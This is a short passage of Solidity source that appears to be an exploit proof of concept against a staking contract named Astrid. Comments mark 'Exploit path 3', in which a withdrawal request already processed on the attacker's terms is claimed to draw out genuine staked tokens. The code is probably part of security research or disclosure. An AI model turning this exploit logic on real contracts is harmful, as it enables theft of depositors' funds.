            // It demonstrates the concrete on-chain blocker for profit realization at forks
            // where auto-processing is disabled.
            try ASTRID.processWithdrawals() {} catch {}

            executed = true;
            return;
        }

        uint256 balanceBefore = IERC20Minimal(selectedStakedToken).balanceOf(address(this));

        // Exploit path 3:
        // claim the processed request to receive genuine staked tokens from Astrid.
        // The profit exists only because processing already trusted the attacker's
